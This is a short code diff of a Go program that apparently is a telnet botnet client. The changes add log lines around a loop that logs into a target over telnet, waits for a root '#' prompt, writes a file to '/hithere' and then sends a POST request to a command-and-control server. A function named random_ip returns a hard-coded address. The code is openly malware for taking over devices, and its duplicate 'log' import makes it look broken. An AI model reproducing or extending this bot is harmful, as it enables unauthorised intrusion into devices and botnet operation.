@@ -5,8 +5,8 @@ import (
 	"log"
 	"os"
 	"time"
-
 	telnet "github.com/ziutek/telnet"
+	log "github.com/Sirupsen/logrus"
 )
 
 const timeout = 10 * time.Second
@@ -63,11 +63,19 @@ func main() {
 			expect(t, "#")
 		case <-ctx.Done():
 			log.Println(ctx.Err()) // prints "aqui"
+			log.Printf("Login unsuccessfull")
 			continue
 		}
-
+		log.Printf("Login successfull!")
 		sendln(t, "echo 'hiiiiii' » /hithere")
+
 		data, err = t.ReadBytes('$')
+		log.Printf("Sending POST request to CnC...")
+		send_POST()
+		log.Printf("POST request successfull")
+		log.Printf("Shutting down bot")
+		
+	
 
 	}
 	os.Stdout.Write(data)
@@ -84,6 +92,7 @@ func random_ip() string {
 	// d := 229
 	//ip:= a+b+c+d
 	//fmt.Println(ip)
+	log.Printf("Generating random IP (not really)")
 	e := "212.237.16.229"
 	//212.237.16.229
 	return e
